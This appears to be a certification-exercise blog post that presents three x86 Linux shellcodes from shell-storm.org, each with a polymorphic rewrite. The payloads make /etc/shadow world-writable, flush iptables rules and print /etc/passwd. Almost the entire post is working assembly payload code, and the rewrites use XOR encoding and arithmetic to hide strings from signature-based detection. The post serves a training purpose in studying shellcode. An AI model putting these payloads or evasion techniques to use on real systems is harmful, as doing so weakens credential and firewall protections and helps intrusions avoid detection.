---
layout: single
title: Polymorphic Linux Shellcode
date: 2018-12-11
classes: wide
header:
  teaser: /assets/images/slae32.png
categories:
  - slae
  - infosec
tags:
  - slae
  - assembly
  - polymorphic
---

This blog post shows 3 polymorphic variants of common shellcodes found on [shell-storm.org](http://shell-storm.org/shellcode/).

Note that the original shellcode is shown here using Intel syntax.

## Sample 1: Linux/x86 - chmod(/etc/shadow, 0777)

- Original size: 29 bytes
- Polymorphic size: 41 bytes (41% increase)
- Source: [http://shell-storm.org/shellcode/files/shellcode-593.php](http://shell-storm.org/shellcode/files/shellcode-593.php)

### Original code:

```nasm
global _start

section .text

_start:

xor eax,eax
push eax
push dword 0x776f6461 ; /etc/shadow
push dword 0x68732f63
push dword 0x74652f2f
mov ebx,esp
push word 0x1ff
pop ecx
mov al,0xf
int 0x80
```

### Polymorphic code:

```nasm
global _start

section .text

_start:

mov ecx, 0x01ff87fd ; XOR key + mode (upper half)
mov eax, 0x0188e899 ; /etc/shadow (XOR encoded)
mov ebx, 0x6097f4d2
mov edx, 0x628be2d2
xor eax, ecx
xor ebx, ecx
xor edx, ecx
push eax
push ebx
push edx  
mov ebx, esp        ; const char *pathname
shr ecx, 16         ; mode_t mode -> 0777
xor eax, eax
add eax, 0xf        ; sys_chmod
int 0x80
```

## Sample 2: Linux/x86 - iptables -F

- Original size: 58 bytes
- Polymorphic size: 67 bytes (15% increase)
- Source: [http://shell-storm.org/shellcode/files/shellcode-361.php](http://shell-storm.org/shellcode/files/shellcode-361.php)

### Original code

```nasm
section .text

global _start

_start:

jmp short callme

main:

pop esi
xor eax,eax
mov byte [esi+14],al
mov byte [esi+17],al
mov long [esi+18],esi
lea ebx,[esi+15]
mov long [esi+22],ebx
mov long [esi+26],eax
mov al,0x0b
mov ebx,esi
lea ecx,[esi+18]
lea edx,[esi+26]
int 0x80

callme:

call main
db '/sbin/iptables#-F#'
```

### Polymorphic code

```nasm
section .text

global _start

_start:

mov eax, 0x2d5a5a46     ; 0x5a462d5a (shifted 16 bits)
ror eax, 0x10
push eax
add eax, 0x191f3f08
push eax
sub eax, 0x11f0fbf9
push eax
sub eax, 0x32450202
add eax, 0x2            ; avoid null-byte
push eax
add eax, 0x3343c0c6
push eax

mov esi, esp            ; esi -> "//sbin//iptablesZ-FZ" 
mov ebx, esi            ; const char *filename
cdq                     ; edx = 0
mov eax, edx            ; eax = 0
mov byte [esi+16], dl   ; null out Z byte: //sbin//iptablesZ -> "//sbin//iptables"
mov byte [esi+19], dl   ; null out Z byte: -FZ -> "-F"
push edx                ; null-terminatation for argv
lea eax, [esi+17]       ; char *const argv[1] -> "-F"
push eax                ; 
push esi                ; char *const argv[0] -> "//sbin//iptables"
mov ecx, esp            ; char *const argv[] -> "//sbin//iptables", "-F"
push edx                ; NULL byte for envp[]
mov eax, edx            ; eax = 0
mov edx, esp            ; char *const envp[] -> NULL
add eax, 0xb            ; sys_execve
int 0x80
```

## Sample 3: Linux/x86 - File Reader /etc/passwd

- Original size: 76 bytes
- Polymorphic size: 90 bytes (18% increase)
- Source: [http://shell-storm.org/shellcode/files/shellcode-73.php](http://shell-storm.org/shellcode/files/shellcode-73.php)

### Original code

```nasm
section .text

global _start

_start:

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
jmp two

one:

pop ebx
mov al, 0x5
xor ecx, ecx
int 0x80
mov esi, eax
jmp read

exit:

mov al, 0x1
xor ebx, ebx
int 0x80

read:

mov ebx, esi
mov al, 0x3
sub esp, 0x1
lea ecx, [esp]
mov dl, 0x1
int 0x80

xor ebx, ebx
cmp ebx, eax
je exit

mov al, 0x4
mov bl, 0x1
mov dl, 0x1
int 0x80

add esp, 0x1
jmp short read

two:

call one
db '/etc/passwd'
```

### Polymorphic code

```nasm
section .text

global _start

_start:

push 0xbadacd9c                 ; //etc/passwd (XOR encoded)
push 0xbfdd918c
push 0xaac891c0

xor ecx, ecx
mov cl, 3
mov edx, esp

decode:

mov eax, dword [edx]
xor eax, 0xdeadbeef             ; XOR key
mov dword [edx], eax
add edx, 0x4
loop decode

xor eax, eax                    ; eax = 0
cdq                             ; edx = 0
mov byte [esp+12], al           ; null terminate string "//etc/passwd"
mov al, 0x5                     ; sys_open
mov ebx, esp                    ; const char *pathname
xor ecx, ecx                    ; int flags
int 0x80

read:

mov ecx, esp                    ; void *buf
push eax                        ; save fd value for next byte read loop
mov ebx, eax                    ; int fd
xor eax, eax                    ; eax = 0
mov dl, 0x1                     ; size_t count = 1, we're reading a single byte at a time
mov al, 0x3                     ; sys_read
int 0x80

cdq                             ; edx = 0
cmp edx, eax                    ; check if we have any bytes left to read
je exit                         ; if not, exit

mov eax, edx                    ; eax = 0
mov ebx, eax                    ; ebx = 0
mov al, 0x4                     ; sys_write
mov bl, 0x1                     ; int fd = 1 (stdout)
mov dl, 0x1                     ; size_t count = 1, we're writing a single byte at a time
int 0x80

pop eax                         ; restore fd value
jmp read                        ; loop to next byte

exit:

mov eax, edx                    ; eax = 0
inc eax                         ; eax = 1, sys_exit
xor ebx, ebx                    ; ebx = 0, int status
int 0x80
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1236

All source files can be found on GitHub at [https://github.com/slemire/slae32](https://github.com/slemire/slae32)